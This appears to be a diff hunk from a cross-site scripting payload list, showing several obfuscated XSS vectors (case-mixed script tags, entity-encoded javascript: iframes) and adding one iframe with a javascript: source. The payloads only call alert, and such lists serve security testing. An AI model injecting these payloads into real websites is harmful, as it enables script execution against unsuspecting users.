@@ -49,7 +49,7 @@ An attacker can use yyy to send a malicious script to an unsuspecting user. The 
 <sVg><scRipt >alert&lpar;23&rpar; {Opera}
 <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
 <script ^__^>alert(String.fromCharCode(49))</script ^__^
-
+<IFRAME SRC="javascript:alert('yyy');"></IFRAME>
 
 
 
